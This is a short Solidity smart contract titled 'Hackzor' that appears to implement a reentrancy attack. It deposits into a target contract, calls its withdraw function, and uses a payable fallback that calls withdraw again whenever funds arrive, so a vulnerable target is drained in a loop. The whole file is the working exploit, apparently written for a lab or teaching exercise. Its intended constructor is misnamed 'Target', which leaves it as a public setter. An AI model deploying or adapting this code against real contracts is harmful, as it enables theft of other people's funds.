pragma solidity^0.4.0;

contract Hackzor {
	address public contract_address;

    // constructor
	function Target(address _addr) {
	    contract_address = _addr;
	}

    // fallback function 
	function () payable {
	    contract_address.call(bytes4(sha3("withdraw(uint256)")), 0.123 ether);
	}
	
	function deposit() payable {
	    contract_address.call.value(msg.value)(bytes4(sha3("deposit()")));
	}

	function withdraw(uint256 _value) {
	    contract_address.call(bytes4(sha3("withdraw(uint256)")), _value);
	}
}